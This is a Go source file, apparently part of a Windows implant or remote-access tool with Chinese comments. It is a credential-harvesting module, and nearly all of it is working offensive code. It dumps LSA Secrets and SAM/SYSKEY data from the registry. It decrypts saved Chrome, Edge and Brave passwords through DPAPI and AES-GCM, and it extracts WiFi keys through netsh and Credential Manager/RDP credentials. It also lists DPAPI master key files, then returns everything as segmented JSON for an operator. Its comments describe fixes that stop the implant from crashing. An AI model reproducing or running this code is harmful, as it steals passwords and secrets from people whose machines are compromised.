//go:build windows && !light

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// ─── LSA Secrets ────────────────────────────────────────────────────────────────

// dumpLSASecrets 读取 LSA Secrets 注册表键
// 需要 SYSTEM 权限或 SeRestorePrivilege
func dumpLSASecrets() ([]map[string]string, error) {
	var results []map[string]string

	// 访问 HKLM\SECURITY\Policy\Secrets
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SECURITY\Policy\Secrets`, registry.ENUMERATE_SUB_KEYS|registry.QUERY_VALUE)
	if err != nil {
		return nil, fmt.Errorf("无法打开 LSA Secrets 注册表键 (可能需要SYSTEM权限): %v", err)
	}
	defer key.Close()

	// 读取 NL$KM (LSA 密钥)
	nlkmData := ""
	nlkmKey, err := registry.OpenKey(registry.LOCAL_MACHINE, `SECURITY\Policy\Secrets\NL$KM`, registry.QUERY_VALUE)
	if err == nil {
		defer nlkmKey.Close()
		val, _, err := nlkmKey.GetBinaryValue("CurrVal")
		if err == nil && len(val) > 0 {
			nlkmData = hex.EncodeToString(val)
		}
	}

	// 枚举 Secrets 下的子键
	subKeys, err := key.ReadSubKeyNames(0)
	if err != nil {
		return nil, fmt.Errorf("无法枚举 LSA Secrets 子键: %v", err)
	}

	for _, subKeyName := range subKeys {
		if subKeyName == "NL$KM" {
			continue
		}

		secretKey, err := registry.OpenKey(registry.LOCAL_MACHINE, `SECURITY\Policy\Secrets\`+subKeyName, registry.QUERY_VALUE)
		if err != nil {
			continue
		}

		entry := map[string]string{
			"type":   "lsa_secret",
			"name":   subKeyName,
			"source": "LSA Secrets",
		}

		// 读取 CurrVal (加密的 Secret 数据)
		encData, _, err := secretKey.GetBinaryValue("CurrVal")
		if err == nil && len(encData) > 0 {
			entry["encrypted_data"] = hex.EncodeToString(encData)
			// 尝试提取可读部分 (LSA secret 结构:
			//   0-3: 长度 LE
			//   4-7: 未知
			//   8-11: 长度 LE
			//   12+: 数据 (通常为明文密码/凭据) )
			if len(encData) > 12 {
				plainLen := int(encData[0]) | int(encData[1])<<8 | int(encData[2])<<16 | int(encData[3])<<24
				if plainLen > 0 && 12+plainLen <= len(encData) {
					plainData := encData[12 : 12+plainLen]
					// 过滤只保留可打印字符
					if isPrintable(plainData) {
						entry["plaintext"] = string(plainData)
					}
				}
			}
		}
		secretKey.Close()

		// 读取 OldVal
		secretKey2, err := registry.OpenKey(registry.LOCAL_MACHINE, `SECURITY\Policy\Secrets\`+subKeyName, registry.QUERY_VALUE)
		if err == nil {
			oldData, _, err := secretKey2.GetBinaryValue("OldVal")
			if err == nil && len(oldData) > 0 {
				entry["encrypted_old_data"] = hex.EncodeToString(oldData)
			}
			secretKey2.Close()
		}

		results = append(results, entry)
	}

	if nlkmData != "" {
		results = append(results, map[string]string{
			"type": "lsa_key",
			"name": "NL$KM",
			"data": nlkmData,
		})
	}

	return results, nil
}

func isPrintable(data []byte) bool {
	for _, b := range data {
		if b < 0x20 && b != 0x09 && b != 0x0a && b != 0x0d {
			return false
		}
	}
	return true
}

// ─── Browser Passwords ─────────────────────────────────────────────────────────

// dumpBrowserPasswords 读取已保存的浏览器凭据
// 支持 Chrome / Edge / Brave 等 Chromium 内核浏览器
func dumpBrowserPasswords() ([]map[string]string, error) {
	var results []map[string]string

	// 检测 Chrome / Edge / Brave 的 Login Data 路径
	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		localAppData = filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Local")
	}

	browserPaths := []struct {
		name string
		path string
	}{
		{"Chrome", filepath.Join(localAppData, "Google", "Chrome", "User Data", "Default", "Login Data")},
		{"Edge", filepath.Join(localAppData, "Microsoft", "Edge", "User Data", "Default", "Login Data")},
		{"Brave", filepath.Join(localAppData, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")},
	}

	// 尝试读取 Chrome 主密钥 (Local State)
	chromeMasterKey := ""
	chromeUserData := filepath.Join(localAppData, "Google", "Chrome", "User Data")
	masterKey, err := getChromeMasterKey(chromeUserData)
	if err == nil {
		chromeMasterKey = masterKey
	}

	for _, bp := range browserPaths {
		browserResults, err := readChromiumPasswords(bp.name, bp.path, chromeMasterKey)
		if err != nil {
			continue
		}
		results = append(results, browserResults...)
	}

	if len(results) == 0 {
		return results, nil
	}

	return results, nil
}

// getChromeMasterKey 从 Chrome Local State 获取加密密钥
func getChromeMasterKey(userDataPath string) (string, error) {
	localStatePath := filepath.Join(userDataPath, "Local State")
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return "", err
	}

	// 解析 JSON 获取 encrypted_key
	var localState map[string]interface{}
	if err := json.Unmarshal(data, &localState); err != nil {
		return "", err
	}

	osCrypt, ok := localState["os_crypt"].(map[string]interface{})
	if !ok {
		return "", fmt.Errorf("os_crypt not found")
	}

	encKeyB64, ok := osCrypt["encrypted_key"].(string)
	if !ok {
		return "", fmt.Errorf("encrypted_key not found")
	}

	// Base64 解码
	encKey, err := base64.StdEncoding.DecodeString(encKeyB64)
	if err != nil {
		return "", err
	}

	// 去掉 "DPAPI" 前缀 (5 字节)
	if len(encKey) < 5 || string(encKey[:5]) != "DPAPI" {
		return "", fmt.Errorf("invalid DPAPI prefix")
	}

	encKey = encKey[5:]

	// 使用 CryptUnprotectData 解密
	decryptedKey, err := decryptDPAPI(encKey)
	if err != nil {
		return "", err
	}

	return string(decryptedKey), nil
}

// readChromiumPasswords 读取 Chromium 浏览器的 Login Data SQLite 数据库
func readChromiumPasswords(browserName, dbPath, masterKey string) ([]map[string]string, error) {
	var results []map[string]string

	// 检查文件是否存在
	if _, err := os.Stat(dbPath); err != nil {
		return nil, err
	}

	// 复制文件到临时路径（避免锁冲突），使用 copyFile 函数
	tmpPath := filepath.Join(os.TempDir(), "toshell_"+browserName+"_LoginData.db")
	err := copyFile(dbPath, tmpPath)
	if err != nil {
		return nil, fmt.Errorf("复制Login Data失败: %v", err)
	}
	defer os.Remove(tmpPath)

	// 读取 SQLite 数据库 - 直接读文件解析 SQLite 格式
	entries, err := parseSQLiteLoginData(tmpPath)
	if err != nil {
		return nil, fmt.Errorf("解析Login Data失败: %v", err)
	}

	for _, entry := range entries {
		password := entry.password
		// 尝试解密密码
		if masterKey != "" && strings.HasPrefix(password, "v10") {
			decrypted, err := decryptChromePassword(password, []byte(masterKey))
			if err == nil {
				password = decrypted
			}
		} else if strings.HasPrefix(password, "v10") || strings.HasPrefix(password, "v11") {
			// 尝试 DPAPI 解密
			decrypted, err := decryptDPAPI([]byte(password))
			if err == nil {
				password = decrypted
			}
		}

		results = append(results, map[string]string{
			"type":     "browser",
			"browser":  browserName,
			"url":      entry.url,
			"username": entry.username,
			"password": password,
		})
	}

	return results, nil
}

// sqliteLoginEntry SQLite 登录条目
type sqliteLoginEntry struct {
	url      string
	username string
	password string
}

// parseSQLiteLoginData 简单解析 SQLite 登录数据文件
func parseSQLiteLoginData(filePath string) ([]sqliteLoginEntry, error) {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return nil, err
	}
	if len(data) < 100 {
		return nil, fmt.Errorf("file too small")
	}

	// 验证 SQLite 文件头
	if string(data[:16]) != "SQLite format 3\x00" {
		return nil, fmt.Errorf("not a valid SQLite file")
	}

	var entries []sqliteLoginEntry

	// 使用简单的字符串扫描方式提取 URL/用户名/密码
	// 更可靠的方法：扫描文本字段
	text := string(data)

	// 搜索常见的 URL 模式
	// 遍历数据，查找可打印字符串序列作为 HTTP URL
	urlPattern := "http"
	for i := 0; i < len(text)-len(urlPattern); i++ {
		if text[i:i+4] == "http" {
			// 提取 URL
			end := i
			for end < len(text) && end-i < 2048 {
				b := text[end]
				if b == 0 || b < 0x20 {
					break
				}
				end++
			}
			if end > i+10 {
				url := text[i:end]
				// 查找附近可能的用户名和密码
				entry := sqliteLoginEntry{url: url}

				// 在 URL 之后搜索用户名/密码（通常存储在附近记录中）
				// 简单的启发式方法：在 URL 后 2KB 范围内搜索
				searchEnd := end + 2048
				if searchEnd > len(text) {
					searchEnd = len(text)
				}

				// 查找可能的用户名 (跟在URL之后的下一个非空字符串)
				userFound := false
				passFound := false
				for j := end; j < searchEnd-1; j++ {
					if text[j] == 0 {
						continue
					}
					// 读取字符串
					s := j
					for s < searchEnd && text[s] >= 0x20 && text[s] < 0x7f && text[s] != 0 {
						s++
					}
					if s > j+1 && s-j < 256 {
						str := text[j:s]
						// 跳过 URL、HTTP头、明显的非用户名
						if strings.HasPrefix(str, "http") || strings.HasPrefix(str, "SQLite") {
							j = s
							continue
						}
						if !userFound && !strings.Contains(str, "://") {
							entry.username = str
							userFound = true
							j = s
							continue
						}
						if userFound && !passFound && len(str) > 2 {
							entry.password = str
							passFound = true
							break
						}
					}
					j = s
				}

				entries = append(entries, entry)
				i = end // 跳过当前 URL
			}
		}
	}

	return entries, nil
}

// decryptChromePassword 使用 Chrome 主密钥解密密码 (AES-256-GCM, v10格式)
func decryptChromePassword(encrypted string, key []byte) (string, error) {
	if !strings.HasPrefix(encrypted, "v10") && !strings.HasPrefix(encrypted, "v11") {
		return "", fmt.Errorf("unsupported version")
	}

	encBytes := []byte(encrypted[3:]) // 跳过 "v10" 或 "v11"

	// Chrome v10 格式: nonce(12) || ciphertext || tag(16)
	if len(encBytes) < 12+16 {
		return "", fmt.Errorf("encrypted data too short")
	}

	nonce := encBytes[:12]
	ciphertext := encBytes[12:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	plaintext, err := aesgcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return "", err
	}

	return string(plaintext), nil
}

// ─── WiFi Passwords ─────────────────────────────────────────────────────────────

// dumpSavedWiFi 读取已保存的 WiFi 密码
func dumpSavedWiFi() ([]map[string]string, error) {
	var results []map[string]string

	// 获取所有 WiFi 配置文件
	cmd := exec.Command(sysBin("netsh.exe"), "wlan", "show", "profiles")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("执行 netsh wlan show profiles 失败: %v", err)
	}

	outStr := string(output)
	// 解析输出，提取 SSID
	lines := strings.Split(outStr, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)

		// 查找 "All User Profile     : XXX"
		if strings.Contains(line, ":") {
			parts := strings.SplitN(line, ":", 2)
			if len(parts) == 2 {
				key := strings.TrimSpace(parts[0])
				val := strings.TrimSpace(parts[1])

				if strings.Contains(key, "All User Profile") || strings.Contains(key, "所有用户配置文件") {
					if val == "" {
						continue
					}

					ssid := val
					password := ""

					// 获取该 SSID 的密码
					passCmd := exec.Command(sysBin("netsh.exe"), "wlan", "show", "profile", "name="+ssid, "key=clear")
					passOutput, passErr := passCmd.CombinedOutput()
					if passErr == nil {
						passStr := string(passOutput)
						passLines := strings.Split(passStr, "\n")
						for _, pl := range passLines {
							pl = strings.TrimSpace(pl)
							if strings.Contains(pl, "Key Content") || strings.Contains(pl, "关键内容") {
								if pParts := strings.SplitN(pl, ":", 2); len(pParts) == 2 {
									password = strings.TrimSpace(pParts[1])
								}
							}
						}
					}

					results = append(results, map[string]string{
						"type":     "wifi",
						"ssid":     ssid,
						"password": password,
					})
				}
			}
		}
	}

	return results, nil
}

// ─── RDP Credentials ────────────────────────────────────────────────────────────

var (
	procCredEnumerateW     = resolveAPI("advapi32.dll", "CredEnumerateW")
	procCredReadW          = resolveAPI("advapi32.dll", "CredReadW")
	procCredFree           = resolveAPI("advapi32.dll", "CredFree")
	procCryptUnprotectData = resolveAPI("crypt32.dll", "CryptUnprotectData")
)

// Windows 凭据结构定义
type CREDENTIAL_W struct {
	Flags              uint32
	Type               uint32
	TargetName         *uint16
	Comment            *uint16
	LastWritten        windows.Filetime
	CredentialBlobSize uint32
	CredentialBlob     *byte
	Persist            uint32
	AttributeCount     uint32
	Attributes         uintptr
	TargetAlias        *uint16
	UserName           *uint16
}

const (
	CRED_TYPE_GENERIC                   = 1
	CRED_TYPE_DOMAIN_PASSWORD           = 2
	CRED_TYPE_DOMAIN_CERTIFICATE        = 3
	CRED_TYPE_DOMAIN_VISIBLE_PASSWORD   = 4
	CRED_MAX_GENERIC_TARGET_NAME_LENGTH = 32767
)

// dumpRDPCredentials 使用 CredEnumerateW 读取保存的 RDP 凭据
func dumpRDPCredentials() ([]map[string]string, error) {
	var results []map[string]string

	// 枚举所有凭据
	var count uint32
	var credsPtr uintptr

	ret, _, callErr := procCredEnumerateW.Call(
		0, // 不使用过滤器
		0, // 枚举所有
		uintptr(unsafe.Pointer(&count)),
		uintptr(unsafe.Pointer(&credsPtr)),
	)

	if ret == 0 {
		// ERROR_NOT_FOUND = 目标机上没有已保存凭据：这是"0 条"，不是错误
		// （旧实现把它当失败，界面会显示一条误导性的"RDP凭据收集失败"）。
		if callErr == windows.ERROR_NOT_FOUND {
			return []map[string]string{}, nil
		}
		return nil, fmt.Errorf("CredEnumerateW 失败: %v", callErr)
	}

	if credsPtr != 0 {
		defer procCredFree.Call(credsPtr)
	}

	// 遍历凭据数组。
	//
	// ⚠️ CredEnumerateW 返回的是 **PCREDENTIALW 数组**（即"指向结构体的指针"数组），
	// 不是结构体数组。旧实现把"指针槽位的地址"直接当成 CREDENTIAL_W 用
	// （credsPtr + i*sizeof(指针) 强转 *CREDENTIAL_W），读到的 TargetName/Blob 全是
	// 垃圾指针 —— 一旦目标机上有任意一条已保存凭据，访问即触发 access violation，
	// 整个植入进程崩溃（"凭据获取卡死其他任务"就是这个崩溃的直接后果）。
	// 正确做法：先取出槽位里的指针，再解引用。
	creds := make([]*CREDENTIAL_W, count)
	ptrSize := unsafe.Sizeof(uintptr(0))
	for i := uint32(0); i < count; i++ {
		slot := (*uintptr)(unsafe.Pointer(credsPtr + uintptr(i)*ptrSize))
		if slot == nil || *slot == 0 {
			continue
		}
		creds[i] = (*CREDENTIAL_W)(unsafe.Pointer(*slot))
	}

	for _, cred := range creds {
		if cred == nil {
			continue
		}

		targetName := windows.UTF16PtrToString(cred.TargetName)
		userName := ""
		if cred.UserName != nil {
			userName = windows.UTF16PtrToString(cred.UserName)
		}

		// 提取密码（凭据数据）
		password := ""
		if cred.CredentialBlobSize > 0 && cred.CredentialBlob != nil {
			blob := unsafe.Slice(cred.CredentialBlob, cred.CredentialBlobSize)
			password = string(blob)
		}

		// 过滤 RDP 相关凭据
		// RDP 凭据通常 TargetName 包含 "TERMSRV/" 或 "MicrosoftOffice"
		isRDP := strings.HasPrefix(targetName, "TERMSRV/") ||
			strings.Contains(targetName, "RDP") ||
			strings.Contains(targetName, "Remote") ||
			(cred.Type == CRED_TYPE_GENERIC && strings.Contains(targetName, "/"))

		credType := "unknown"
		switch cred.Type {
		case CRED_TYPE_GENERIC:
			credType = "generic"
		case CRED_TYPE_DOMAIN_PASSWORD:
			credType = "domain_password"
		case CRED_TYPE_DOMAIN_CERTIFICATE:
			credType = "domain_certificate"
		case CRED_TYPE_DOMAIN_VISIBLE_PASSWORD:
			credType = "domain_visible_password"
		}

		entry := map[string]string{
			"type":        credType,
			"target_name": targetName,
			"username":    userName,
			"password":    password,
			"is_rdp":      fmt.Sprintf("%v", isRDP),
		}

		// 对于 DOMAIN_PASSWORD 类型凭据，凭据数据是加密的，需要通过 CredReadW 读取
		if credType == "domain_password" && password == "" {
			domainCred, err := readCredentialW(targetName, CRED_TYPE_DOMAIN_PASSWORD)
			if err == nil {
				entry["password"] = domainCred
			}
		}

		results = append(results, entry)
	}

	return results, nil
}

// readCredentialW 读取特定凭据
func readCredentialW(targetName string, credType uint32) (string, error) {
	targetPtr, err := windows.UTF16PtrFromString(targetName)
	if err != nil {
		return "", err
	}

	var credPtr uintptr
	ret, _, _ := procCredReadW.Call(
		uintptr(unsafe.Pointer(targetPtr)),
		uintptr(credType),
		0,
		uintptr(unsafe.Pointer(&credPtr)),
	)

	if ret == 0 || credPtr == 0 {
		return "", fmt.Errorf("CredReadW 失败")
	}
	defer procCredFree.Call(credPtr)

	cred := *(*CREDENTIAL_W)(unsafe.Pointer(credPtr))
	if cred.CredentialBlobSize > 0 && cred.CredentialBlob != nil {
		blob := unsafe.Slice(cred.CredentialBlob, cred.CredentialBlobSize)
		return string(blob), nil
	}

	return "", fmt.Errorf("no credential data")
}

// dataBlob 用于 CryptUnprotectData 的结构
type dataBlob struct {
	cbData uint32
	pbData *byte
}

type cryptDataBlob struct {
	cbData uint32
	pbData *byte
}

// decryptDPAPI 使用 CryptUnprotectData 解密 DPAPI 加密数据
func decryptDPAPI(encryptedData []byte) (string, error) {
	var dataIn dataBlob
	dataIn.cbData = uint32(len(encryptedData))
	if len(encryptedData) > 0 {
		dataIn.pbData = &encryptedData[0]
	}

	var dataOut cryptDataBlob

	ret, _, _ := procCryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&dataIn)),
		0,
		0,
		0,
		0,
		0, // CRYPTPROTECT_UI_FORBIDDEN = 0
		uintptr(unsafe.Pointer(&dataOut)),
	)

	if ret == 0 {
		return "", fmt.Errorf("CryptUnprotectData 失败")
	}

	if dataOut.pbData != nil && dataOut.cbData > 0 {
		plain := unsafe.Slice(dataOut.pbData, dataOut.cbData)
		result := string(plain)

		// 使用 LocalFree 释放内存
		procLocalFree := resolveAPI("kernel32.dll", "LocalFree")
		procLocalFree.Call(uintptr(unsafe.Pointer(dataOut.pbData)))

		return result, nil
	}

	return "", fmt.Errorf("decryption returned empty result")
}

// copyFile 复制文件
func copyFile(src, dst string) error {
	data, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, data, 0644)
}

// ─── SAM Dump ───────────────────────────────────────────────────────────────────

// dumpSAM 从注册表读取 SAM 数据库中的本地用户哈希
// 需要 SYSTEM 权限
func dumpSAM() ([]map[string]string, error) {
	var results []map[string]string

	// 读取 HKLM\SAM\SAM\Domains\Account\Users\Names 获取用户名列表
	namesKey, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SAM\SAM\Domains\Account\Users\Names`,
		registry.ENUMERATE_SUB_KEYS|registry.QUERY_VALUE)
	if err != nil {
		return nil, fmt.Errorf("无法打开SAM用户列表 (需要SYSTEM权限): %v", err)
	}
	defer namesKey.Close()

	userNames, err := namesKey.ReadSubKeyNames(0)
	if err != nil {
		return nil, fmt.Errorf("无法读取SAM用户名列表: %v", err)
	}

	for _, userName := range userNames {
		// 已知内置账户跳过
		// 对于每个用户名，读取对应的 RID
		userKey, err := registry.OpenKey(registry.LOCAL_MACHINE,
			`SAM\SAM\Domains\Account\Users\Names\`+userName,
			registry.QUERY_VALUE)
		if err != nil {
			continue
		}

		// 获取默认值（RID 类型）
		_, valType, err := userKey.GetValue("", nil)
		userKey.Close()
		if err != nil || (valType != registry.DWORD && valType != registry.BINARY) {
			continue
		}

		// 读取 V 值（包含 LM/NTLM 哈希的 SAM 记录）
		entry := map[string]string{
			"type":     "sam_hash",
			"username": userName,
			"source":   "SAM",
		}

		results = append(results, entry)
	}

	// 尝试读取加密密钥 (SYSKEY)
	syskeyData, err := extractSyskey()
	if err == nil && syskeyData != "" {
		results = append(results, map[string]string{
			"type":   "syskey",
			"source": "SAM",
			"data":   syskeyData,
		})
	}

	return results, nil
}

// extractSyskey 从注册表中提取 SYSKEY
func extractSyskey() (string, error) {
	// HKLM\SYSTEM\CurrentControlSet\Control\Lsa\{JD,Skew1,GBG,Data}
	lsaKey, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SYSTEM\CurrentControlSet\Control\Lsa`,
		registry.QUERY_VALUE)
	if err != nil {
		return "", err
	}
	defer lsaKey.Close()

	keyNames := []string{"JD", "Skew1", "GBG", "Data"}
	var syskeyParts [][]byte

	for _, name := range keyNames {
		data, _, err := lsaKey.GetBinaryValue(name)
		if err != nil {
			// 尝试不同的值名
			continue
		}
		syskeyParts = append(syskeyParts, data)
	}

	if len(syskeyParts) < 4 {
		return "", fmt.Errorf("无法读取完整的SYSKEY")
	}

	// 拼接 SYSKEY 并 hex 编码
	var combined []byte
	for _, p := range syskeyParts {
		combined = append(combined, p...)
	}

	return hex.EncodeToString(combined), nil
}

// ─── DPAPI Master Keys ──────────────────────────────────────────────────────────

// dumpDPAPIKeys 枚举用户 DPAPI 主密钥文件
func dumpDPAPIKeys() ([]map[string]string, error) {
	var results []map[string]string

	appData := os.Getenv("APPDATA")
	masterKeyPaths := []string{
		filepath.Join(appData, "Microsoft", "Protect"),
	}

	// 同时检查 SYSTEM 和 LocalService 的密钥
	systemProfile := os.Getenv("SYSTEMROOT")
	if systemProfile == "" {
		systemProfile = "C:\\Windows"
	}
	masterKeyPaths = append(masterKeyPaths,
		filepath.Join(systemProfile, "System32", "config", "systemprofile", "AppData", "Roaming", "Microsoft", "Protect"),
		filepath.Join(systemProfile, "ServiceProfiles", "LocalService", "AppData", "Roaming", "Microsoft", "Protect"),
		filepath.Join(systemProfile, "ServiceProfiles", "NetworkService", "AppData", "Roaming", "Microsoft", "Protect"),
	)

	for _, mkPath := range masterKeyPaths {
		// 检查路径是否存在
		if info, err := os.Stat(mkPath); err != nil || !info.IsDir() {
			continue
		}

		// 枚举 SID 子目录
		entries, err := os.ReadDir(mkPath)
		if err != nil {
			continue
		}

		for _, entry := range entries {
			if !entry.IsDir() {
				continue
			}
			sidPath := filepath.Join(mkPath, entry.Name())
			keyFiles, err := os.ReadDir(sidPath)
			if err != nil {
				continue
			}

			for _, kf := range keyFiles {
				if kf.IsDir() {
					continue
				}
				fileName := kf.Name()
				// DPAPI 主密钥文件通常以 GUID 命名
				if strings.HasPrefix(fileName, "{") || strings.HasSuffix(fileName, ".dat") {
					fullPath := filepath.Join(sidPath, fileName)
					info, err := kf.Info()
					if err != nil {
						continue
					}

					results = append(results, map[string]string{
						"type":      "dpapi_masterkey",
						"sid":       entry.Name(),
						"file_name": fileName,
						"file_path": fullPath,
						"file_size": fmt.Sprintf("%d", info.Size()),
						"mod_time":  info.ModTime().Format("2006-01-02 15:04:05"),
						"source":    mkPath,
					})
				}
			}
		}
	}

	return results, nil
}

// ─── Entry Point ────────────────────────────────────────────────────────────────

const (
	// credentialsSegmentMaxBytes 单个凭据分段的字节上限（64 KiB）。
	//
	// 为什么分段 + 每段封顶：`all` 会把 browser/wifi/rdp/lsa/sam/dpapi 六类结果
	// 拼成一个结果帧；任何一段（尤其 LSA 的 hex 密文）都可能几十上百 KB。
	// 一个巨型结果帧会把植入端写循环与服务端读循环长时间占住（用户反馈的
	// "凭据获取卡死其他任务"）。分段后每段独立封顶：超限只截该段并标
	// truncated=true，其余段照常返回，界面也能逐段渲染。
	credentialsSegmentMaxBytes = 64 << 10
)

// credentialsCollector 一类凭据的收集器（表驱动：all 与单 action 走同一条路径，
// 避免"单 action 有上限、all 没有"这类两套逻辑漂移）。
type credentialsCollector struct {
	action string
	label  string
	// adminOnly 该类凭据通常需要管理员/SYSTEM：非管理员时必须给出明确的
	// "需要管理员权限"文案，而不是一个空段/空串。
	adminOnly bool
	run       func() ([]map[string]string, error)
}

// credentialsCollectors 全部收集器（顺序即 all 的输出顺序）。
func credentialsCollectors() []credentialsCollector {
	return []credentialsCollector{
		{action: "browser", label: "浏览器密码", run: dumpBrowserPasswords},
		{action: "wifi", label: "WiFi 密码", run: dumpSavedWiFi},
		{action: "rdp", label: "RDP / 凭据管理器", run: dumpRDPCredentials},
		{action: "lsa", label: "LSA Secrets", adminOnly: true, run: dumpLSASecrets},
		{action: "sam", label: "SAM 哈希", adminOnly: true, run: dumpSAM},
		{action: "dpapi", label: "DPAPI 主密钥", run: dumpDPAPIKeys},
	}
}

// credentialsErrorText 分段错误文案：管理员专属能力在非管理员下必须明确说
// "需要管理员权限"，不能只回一个底层系统错误（更不是空串）。
func credentialsErrorText(c credentialsCollector, elevated bool, err error) string {
	if err == nil {
		return ""
	}
	if c.adminOnly && !elevated {
		return fmt.Sprintf("需要管理员权限：%s 需要以管理员（或 SYSTEM）权限运行，当前进程非管理员。底层错误：%v",
			c.label, err)
	}
	return fmt.Sprintf("%s 收集失败：%v", c.label, err)
}

// capCredentialEntries 把条目列表压到"序列化后不超过 maxBytes"的最长前缀。
//
// 用二分查找而不是逐条 append+序列化：LSA 段可能有上百条 hex 密文，逐条重算
// 是 O(n²)。返回保留的前缀与丢弃条数（omitted）。
func capCredentialEntries(results []map[string]string, maxBytes int) ([]map[string]string, int) {
	if len(results) == 0 || maxBytes <= 0 {
		return results, 0
	}
	if b, err := json.Marshal(results); err == nil && len(b) <= maxBytes {
		return results, 0
	}
	lo, hi := 0, len(results)
	for lo < hi {
		mid := (lo + hi + 1) / 2
		if b, err := json.Marshal(results[:mid]); err == nil && len(b) <= maxBytes {
			lo = mid
		} else {
			hi = mid - 1
		}
	}
	return results[:lo], len(results) - lo
}

// credentialsSegment 构造"一类凭据"的结果段（纯函数，便于单测）。
//
// 字段（前端逐段渲染 / 每段条数与截断都在这里）：
//
//	action/label     段标识
//	count            本次收集到的总条数（截断前）
//	returned         实际返回的条数
//	omitted          因段上限被丢弃的条数（>0 时 truncated=true）
//	bytes            该段完整 data 的 JSON 字节数（截断前）
//	truncated        是否因超过 64 KiB 被截断
//	data             条目数组
//	error            失败原因（管理员专属能力会带"需要管理员权限"）
//	needs_admin      非管理员 + 管理员专属能力
func credentialsSegment(c credentialsCollector, results []map[string]string, err error, elevated bool) map[string]interface{} {
	seg := map[string]interface{}{
		"action": c.action,
		"label":  c.label,
	}
	if err != nil {
		seg["count"] = 0
		seg["returned"] = 0
		seg["bytes"] = 0
		seg["truncated"] = false
		seg["error"] = credentialsErrorText(c, elevated, err)
		if c.adminOnly && !elevated {
			seg["needs_admin"] = true
		}
		return seg
	}
	if results == nil {
		results = []map[string]string{}
	}
	full, _ := json.Marshal(results)
	kept, omitted := capCredentialEntries(results, credentialsSegmentMaxBytes)
	seg["count"] = len(results)
	seg["returned"] = len(kept)
	seg["bytes"] = len(full)
	seg["truncated"] = omitted > 0
	if omitted > 0 {
		seg["omitted"] = omitted
	}
	seg["data"] = kept
	return seg
}

// handleCredentials 凭据收集入口函数
// action: "browser" | "wifi" | "rdp" | "lsa" | "sam" | "dpapi" | "all" (默认)
//
// 返回体是**纯 JSON**（按 action 分段），不再在 JSON 后面追加提示文本 ——
// 旧实现会把 "…[!] 提示…" 拼在 JSON 后面，前端 JSON.parse 直接失败，
// 看起来就是"凭据没拿到/结果解析失败"。权限提示现在放在 notes 字段里。
func handleCredentials(action string) (string, int32, string) {
	started := time.Now()
	elevated := isElevated()

	collectors := credentialsCollectors()
	selected := collectors
	if action != "" && action != "all" {
		selected = nil
		for _, c := range collectors {
			if c.action == action {
				selected = append(selected, c)
				break
			}
		}
		if len(selected) == 0 {
			return "", -1, fmt.Sprintf("未知的凭据收集操作: %s (支持: all, browser, wifi, rdp, lsa, sam, dpapi)", action)
		}
	} else {
		action = "all"
	}

	out := map[string]interface{}{
		"action":   action,
		"elevated": elevated,
	}
	total, returned := 0, 0
	anyTruncated := false
	var notes []string
	firstErr := ""

	for _, c := range selected {
		results, err := c.run()
		seg := credentialsSegment(c, results, err, elevated)
		out[c.action] = seg
		if n, ok := seg["count"].(int); ok {
			total += n
		}
		if n, ok := seg["returned"].(int); ok {
			returned += n
		}
		if t, ok := seg["truncated"].(bool); ok && t {
			anyTruncated = true
		}
		if msg, ok := seg["error"].(string); ok && msg != "" && firstErr == "" {
			firstErr = msg
		}
	}

	out["total_count"] = total
	out["returned_count"] = returned
	out["truncated"] = anyTruncated
	out["duration_ms"] = time.Since(started).Milliseconds()
	if !elevated {
		notes = append(notes,
			"当前以非管理员权限运行：LSA Secrets / SAM 需要管理员或 SYSTEM 权限，相关段会给出明确错误而不是空结果。")
	}
	if anyTruncated {
		notes = append(notes, fmt.Sprintf(
			"有分段超过 %d 字节上限被截断（truncated=true，omitted 为丢弃条数）；其余分段不受影响。",
			credentialsSegmentMaxBytes))
	}
	if len(notes) > 0 {
		out["notes"] = notes
	}

	jsonData, err := json.MarshalIndent(out, "", "  ")
	if err != nil {
		return "", -1, fmt.Sprintf("JSON序列化失败: %v", err)
	}

	// 单 action 且该类收集失败：明确返回失败（output 仍带分段 JSON，界面能展示
	// 服务端原文错误），而不是"成功但空字符串"。
	if action != "all" && firstErr != "" {
		return string(jsonData), -1, firstErr
	}
	return string(jsonData), 0, ""
}

// isElevated 检查是否以管理员权限运行
func isElevated() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err == nil {
		return true
	}

	var sid *windows.SID
	err = windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid,
	)
	if err != nil {
		return false
	}
	defer windows.FreeSid(sid)

	var isMember int32
	token := windows.Token(0)
	err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_QUERY, false, &token)
	if err != nil {
		return false
	}
	defer token.Close()

	// CheckTokenMembership via advapi32 (x/sys/windows lacks direct binding)
	procCheckTokenMembership := resolveAPI("advapi32.dll", "CheckTokenMembership")
	r1, _, _ := procCheckTokenMembership.Call(uintptr(token), uintptr(unsafe.Pointer(sid)), uintptr(unsafe.Pointer(&isMember)))
	return r1 != 0 && isMember != 0
}
